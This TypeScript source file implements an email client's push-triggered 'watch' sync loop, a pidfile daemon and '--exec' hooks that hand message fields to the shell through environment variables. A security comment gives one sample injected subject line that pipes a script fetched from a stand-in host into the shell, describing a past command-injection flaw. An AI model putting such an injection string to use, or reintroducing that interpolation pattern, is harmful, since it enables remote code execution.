import type { DatabaseSync } from "node:sqlite";
import { spawn, type SpawnOptions } from "node:child_process";
import { existsSync, readFileSync, unlinkSync, writeFileSync } from "node:fs";
import type { JmapClient } from "./jmap.js";
import { sync } from "./sync.js";
import { accountLabel, type AccountRef } from "./db.js";

/**
 * `bullmoose watch` — long-running, push-triggered sync.
 *
 * Design: PUSH IS A HINT, THE CHANGELOG IS THE TRUTH. The WebSocket to
 * the account's Durable Object delivers StateChange hints; every hint
 * (debounced) just triggers the ordinary incremental sync off the local
 * cursor. Missed pushes are therefore harmless: each (re)connect and a
 * slow fallback timer run the same catch-up. The watcher never interprets
 * push payload contents.
 */

const DEBOUNCE_MS = 300;
const FALLBACK_SYNC_MS = 5 * 60_000;
const BACKOFF_MIN_MS = 1_000;
const BACKOFF_MAX_MS = 60_000;

export interface WatchOptions {
  json: boolean;
  exec?: string;
  /** Remove this pidfile on exit (set when running as a daemon). */
  pidFile?: string;
}

interface WatchRow {
  id: string;
  subject: string;
  from_json: string;
  preview: string;
  received_at: number;
  mailboxes: string | null;
}

// ---- --exec hooks -------------------------------------------------------
//
// SECURITY CONTRACT (do not weaken): the only thing `sh -c` ever parses is
// the operator's own template. Message fields — every one of which is
// attacker-controlled, since a stranger chooses the subject, display name
// and body of the mail they send you — are handed to the hook through the
// environment, where the shell copies them as opaque bytes and the
// operator's quoting alone decides how they expand.
//
// The previous design interpolated the fields into the command string and
// leaned on a character blocklist. That is remotely-triggered RCE whenever
// the template leaves a placeholder outside double quotes (`--exec 'echo
// {subject}'` + a subject of `x; curl evil.sh|sh`), because `;`, `|`, `&`,
// `(`, `)`, `<`, `>` and newline all survived the filter. Escaping shell
// metacharacters is not a winnable game; never reintroduce it.

/** Message fields handed to a `--exec` hook as `BM_*` env vars. */
export interface HookFields {
  id: string;
  account: string;
  from: string;
  subject: string;
  preview: string;
}

/** `$BM_PREVIEW` is truncated so a huge body can't blow the env size limit. */
export const HOOK_PREVIEW_MAX = 120;

/** Placeholders the old, injectable contract substituted. Warn-only now. */
const LEGACY_PLACEHOLDERS = ["{id}", "{from}", "{subject}", "{preview}"] as const;

/** Which retired `{…}` placeholders a template still uses, if any. */
export function legacyPlaceholders(template: string): string[] {
  return LEGACY_PLACEHOLDERS.filter((p) => template.includes(p));
}

export interface HookPlan {
  command: string;
  args: string[];
  options: SpawnOptions & { env: NodeJS.ProcessEnv };
}

/**
 * Pure core of the hook: what we would hand to `spawn`.
 *
 * `args` is always exactly `["-c", template]` — the caller's template,
 * byte-for-byte, with nothing spliced in.
 */
export function hookPlan(
  template: string,
  fields: HookFields,
  opts: { json?: boolean; env?: NodeJS.ProcessEnv } = {},
): HookPlan {
  return {
    command: "sh",
    args: ["-c", template],
    options: {
      env: {
        ...(opts.env ?? process.env),
        BM_ID: fields.id,
        BM_ACCOUNT: fields.account,
        BM_FROM: fields.from,
        BM_SUBJECT: fields.subject,
        BM_PREVIEW: fields.preview.slice(0, HOOK_PREVIEW_MAX),
      },
      // Under --json our stdout is a data stream, so the hook must not get
      // it: fd 2 routes the hook's stdout to our stderr instead. stdin is
      // always closed — a hook must never steal the terminal.
      stdio: ["ignore", opts.json ? 2 : "inherit", "inherit"],
    },
  };
}

/** Just enough of `ChildProcess` for the hook; lets tests pass a fake spawn. */
export interface HookChild {
  on(event: "error", listener: (err: Error) => void): unknown;
}
export type SpawnLike = (command: string, args: string[], options: SpawnOptions) => HookChild;

/**
 * Fire-and-forget: a slow hook must never stall the watch loop, so nothing
 * awaits the child. Failures surface through `onError`.
 */
export function runHook(
  template: string,
  fields: HookFields,
  opts: {
    json?: boolean;
    env?: NodeJS.ProcessEnv;
    spawnFn?: SpawnLike;
    onError?: (message: string) => void;
  } = {},
): void {
  const plan = hookPlan(template, fields, opts);
  const child = (opts.spawnFn ?? spawn)(plan.command, plan.args, plan.options);
  child.on("error", (err) => opts.onError?.(`--exec failed: ${err.message}`));
}

export async function watch(
  db: DatabaseSync,
  client: JmapClient,
  accounts: AccountRef[],
  base: string,
  token: string,
  opts: WatchOptions,
): Promise<never> {
  const WebSocketCtor = (globalThis as { WebSocket?: new (url: string) => WsLike }).WebSocket;
  if (!WebSocketCtor) {
    console.error("watch requires Node with a global WebSocket client (Node >= 22)");
    process.exit(1);
  }

  const multi = accounts.length > 1;
  let stopping = false;

  const status = (msg: string) => console.error(`[watch] ${msg}`);

  // Templates written against the old contract would otherwise fail
  // silently (the literal `{subject}` reaches the shell). Say so once —
  // and do NOT substitute: substitution is the vulnerability.
  if (opts.exec) {
    const stale = legacyPlaceholders(opts.exec);
    if (stale.length > 0) {
      status(
        `--exec: ${stale.join(" ")} are no longer substituted (they were a shell-injection vector). ` +
          `Use the environment instead: $BM_ID $BM_ACCOUNT $BM_FROM $BM_SUBJECT $BM_PREVIEW — ` +
          `e.g. --exec 'notify-send "$BM_FROM: $BM_SUBJECT"'`,
      );
    }
  }

  // One channel per account: its own socket, backoff, debounce, and sync
  // serialization — a burst on one inbox never blocks another's pushes.
  interface Channel {
    account: AccountRef;
    ws: WsLike | null;
    backoff: number;
    debounceTimer: NodeJS.Timeout | null;
    syncing: boolean;
    pendingReason: string | null;
  }
  const channels: Channel[] = accounts.map((account) => ({
    account,
    ws: null,
    backoff: BACKOFF_MIN_MS,
    debounceTimer: null,
    syncing: false,
    pendingReason: null,
  }));

  const shutdown = () => {
    stopping = true;
    for (const ch of channels) {
      try {
        ch.ws?.close();
      } catch {
        /* already closed */
      }
    }
    if (opts.pidFile) {
      try {
        unlinkSync(opts.pidFile);
      } catch {
        /* already gone */
      }
    }
    process.exit(0);
  };
  process.on("SIGINT", shutdown);
  process.on("SIGTERM", shutdown);

  const tag = (ch: Channel) => (multi ? `${accountLabel(ch.account)}: ` : "");

  async function runSync(ch: Channel, reason: string): Promise<void> {
    if (ch.syncing) {
      ch.pendingReason = reason; // coalesce; rerun once the current pass ends
      return;
    }
    ch.syncing = true;
    try {
      const stats = await sync(db, client, ch.account.accountId);
      if (stats.mode === "full") {
        status(`${tag(ch)}full sync (${reason}): ${stats.created} messages, state ${stats.newState}`);
      } else if (stats.created + stats.updated + stats.destroyed > 0) {
        status(
          `${tag(ch)}sync (${reason}): +${stats.created} ~${stats.updated} -${stats.destroyed}, state ${stats.newState}`,
        );
      }
      emit(ch, stats.createdIds, "created");
      emit(ch, stats.updatedIds, "updated");
      for (const id of stats.destroyedIds) {
        if (opts.json) {
          console.log(JSON.stringify({ event: "destroyed", id, account: accountLabel(ch.account) }));
        }
      }
    } catch (err) {
      status(`${tag(ch)}sync failed (${reason}): ${err instanceof Error ? err.message : err}`);
    } finally {
      ch.syncing = false;
      if (ch.pendingReason) {
        const next = ch.pendingReason;
        ch.pendingReason = null;
        void runSync(ch, next);
      }
    }
  }

  function scheduleSync(ch: Channel, reason: string): void {
    if (ch.debounceTimer) clearTimeout(ch.debounceTimer);
    ch.debounceTimer = setTimeout(() => void runSync(ch, reason), DEBOUNCE_MS);
  }

  function emit(ch: Channel, ids: string[], event: "created" | "updated"): void {
    if (ids.length === 0) return;
    const marks = ids.map(() => "?").join(",");
    const rows = db
      .prepare(
        `SELECT e.id, e.subject, e.from_json, e.preview, e.received_at,
           (SELECT group_concat(COALESCE(m.role, m.name)) FROM email_mailboxes em
              JOIN mailboxes m ON m.account_id = em.account_id AND m.id = em.mailbox_id
            WHERE em.account_id = e.account_id AND em.email_id = e.id) AS mailboxes
         FROM emails e WHERE e.account_id = ? AND e.id IN (${marks})`,
      )
      .all(ch.account.accountId, ...ids) as unknown as WatchRow[];

    for (const row of rows) {
      const from = (JSON.parse(row.from_json) as Array<{ name?: string; email: string }>)
        .map((a) => a.name ?? a.email)
        .join(", ");
      if (opts.json) {
        console.log(
          JSON.stringify({
            event,
            id: row.id,
            account: accountLabel(ch.account),
            from,
            subject: row.subject,
            preview: row.preview,
            receivedAt: new Date(row.received_at).toISOString(),
            mailboxes: row.mailboxes,
          }),
        );
      } else {
        const date = new Date(row.received_at).toISOString().slice(0, 16).replace("T", " ");
        const mark = event === "created" ? "●" : "~";
        const acct = multi ? `${accountLabel(ch.account).padEnd(20).slice(0, 20)}  ` : "";
        console.log(
          `${mark} ${date}  ${acct}${from.padEnd(24).slice(0, 24)}  ${(row.subject || "(no subject)").slice(0, 48)}  [${row.mailboxes ?? ""}]  ${row.id}`,
        );
      }
      if (opts.exec && event === "created") {
        runHook(
          opts.exec,
          {
            id: row.id,
            account: accountLabel(ch.account),
            from,
            subject: row.subject,
            preview: row.preview,
          },
          { json: opts.json, onError: status },
        );
      }
    }
  }

  function connect(ch: Channel): void {
    if (stopping) return;
    const url = new URL(base);
    url.protocol = url.protocol === "https:" ? "wss:" : "ws:";
    url.pathname = "/api/ws";
    url.searchParams.set("accountId", ch.account.accountId);
    // WebSocket clients can't set an Authorization header.
    url.searchParams.set("access_token", token);

    const socket = new WebSocketCtor!(url.toString());
    ch.ws = socket;

    socket.onopen = () => {
      ch.backoff = BACKOFF_MIN_MS;
      status(`${tag(ch)}connected — waiting for pushes`);
      void runSync(ch, "reconnect"); // catch up on anything missed while offline
    };
    socket.onmessage = (event: { data: unknown }) => {
      try {
        const msg = JSON.parse(String(event.data)) as { "@type"?: string };
        if (msg["@type"] === "StateChange") scheduleSync(ch, "push");
      } catch {
        /* not JSON — ignore */
      }
    };
    socket.onclose = () => reconnect(ch);
    socket.onerror = () => {
      /* onclose fires next; reconnect there */
    };
  }

  function reconnect(ch: Channel): void {
    if (stopping) return;
    const jitter = ch.backoff * (0.5 + Math.random() * 0.5);
    status(`${tag(ch)}disconnected — retrying in ${Math.round(jitter / 1000)}s`);
    setTimeout(() => connect(ch), jitter);
    ch.backoff = Math.min(ch.backoff * 2, BACKOFF_MAX_MS);
  }

  // Startup: catch up first so pushes only ever mean deltas, then listen.
  for (const ch of channels) await runSync(ch, "startup");
  for (const ch of channels) connect(ch);
  // Guard against silently dead sockets: a slow unconditional resync.
  setInterval(() => {
    for (const ch of channels) void runSync(ch, "fallback");
  }, FALLBACK_SYNC_MS).unref?.();

  return new Promise<never>(() => {
    /* runs until signalled */
  });
}

// Minimal structural type for Node's global (undici) WebSocket.
interface WsLike {
  onopen: (() => void) | null;
  onmessage: ((event: { data: unknown }) => void) | null;
  onclose: (() => void) | null;
  onerror: (() => void) | null;
  close(): void;
}

// ---- daemon management (pidfile trio) -----------------------------------

export function pidPaths(dbPath: string): { pid: string; log: string } {
  return { pid: `${dbPath}.watch.pid`, log: `${dbPath}.watch.log` };
}

export function readAlivePid(pidFile: string): number | null {
  if (!existsSync(pidFile)) return null;
  const pid = Number(readFileSync(pidFile, "utf8").trim());
  if (!Number.isInteger(pid) || pid <= 0) return null;
  try {
    process.kill(pid, 0); // liveness probe only
    return pid;
  } catch {
    // Stale pidfile — the process is gone; clean it up.
    try {
      unlinkSync(pidFile);
    } catch {
      /* best effort */
    }
    return null;
  }
}

export function writePid(pidFile: string, pid: number): void {
  writeFileSync(pidFile, `${pid}\n`, { mode: 0o600 });
}
